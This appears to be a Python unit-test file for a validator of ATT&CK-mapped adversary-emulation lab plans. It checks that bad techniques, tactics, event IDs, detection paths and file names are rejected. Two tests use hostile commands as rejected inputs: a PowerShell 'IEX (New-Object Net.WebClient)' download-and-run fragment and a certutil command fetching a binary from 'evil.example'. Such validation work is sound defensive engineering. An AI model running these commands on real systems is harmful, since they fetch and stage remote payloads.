"""Unit tests for tools.validate_plans failure modes."""

from __future__ import annotations

from pathlib import Path

import yaml

from tools.validate_plans import validate_plan


def _write(path: Path, data: dict) -> Path:
    path.write_text(yaml.safe_dump(data, sort_keys=False), encoding="utf-8")
    return path


def test_rejects_unknown_technique(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["technique"] = "T9999"
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("not a current Enterprise ATT&CK technique" in e for e in errors)


def test_rejects_wrong_tactic(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["tactic"] = "impact"
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("not valid for" in e for e in errors)


def test_rejects_forbidden_command(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["procedure"][0]["command"] = "powershell.exe -Command IEX (New-Object Net.WebClient)"
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("disallowed pattern" in e for e in errors)


def test_rejects_non_lab_url(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["procedure"][0]["command"] = (
        "certutil.exe -urlcache -split -f http://evil.example/a.bin %TEMP%\\a.bin"
    )
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("outside the lab domain" in e for e in errors)


def test_rejects_unknown_event(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["telemetry"][0]["event_id"] = 9999
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("windows-events.yml" in e for e in errors)


def test_rejects_unknown_detection_path(tmp_plan: Path) -> None:
    data = yaml.safe_load(tmp_plan.read_text(encoding="utf-8"))
    data["detections"][0]["path"] = "rules/sigma/windows/does_not_exist.yml"
    _write(tmp_plan, data)
    errors = validate_plan(tmp_plan)
    assert any("not in data/detection-rules-manifest.csv" in e for e in errors)


def test_rejects_mismatched_filename(tmp_path: Path, sample_plan: dict) -> None:
    data = dict(sample_plan)
    data["id"] = "PTL-999"
    path = tmp_path / "wrong-name.yml"
    _write(path, data)
    errors = validate_plan(path)
    assert any("file name must start with" in e for e in errors)
